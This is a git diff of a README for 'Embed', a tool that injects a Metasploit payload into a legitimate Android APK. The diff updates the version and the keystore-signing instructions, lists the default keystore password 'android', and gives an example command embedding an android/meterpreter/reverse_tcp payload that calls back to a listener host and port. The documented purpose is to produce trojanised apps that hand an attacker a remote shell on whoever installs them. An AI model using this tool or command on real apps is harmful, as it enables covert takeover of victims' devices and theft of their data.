@@ -1,4 +1,4 @@
-# EMBED v.2.0
+# EMBED v.3.0
 This tool creates a payload with metasploit framework and injected into a legitimate APK.
 
 	DISCLAIMER
@@ -32,11 +32,11 @@ apt install embed -y
 ```
 
 # USAGE
-### [Usage]─➤ embed.rb [target.apk] [msfvenom options]
-- Embed v3+ come with 3 options to use a keystore signature for sign your apk files :
-{3} To create your own keystore.
-{2} Using your own keystore; if you have one or if you was created it before in option 3.
-{1} Default: Using a keystore with the next parameters :
+Embed v3+ come with 3 options to use a keystore signature for sign your apk files :
+- {3} To create your own keystore.
+- {2} Using your own keystore; if you have one or if you was created it before in option 3.
+- {1} Default: Using a keystore with the next parameters :
+
 ```
 Enter keystore password: android
 Re-enter new password: android
@@ -61,6 +61,9 @@ for: CN=Android Debugging, OU=Android, O=Android Debugging, L=California, ST=San
 ```
 
 # EXAMPLE OF USAGE
+``` bash
+$ embed.rb [target.apk] [msfvenom options]
+```
 ```
 $ embed PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546
 
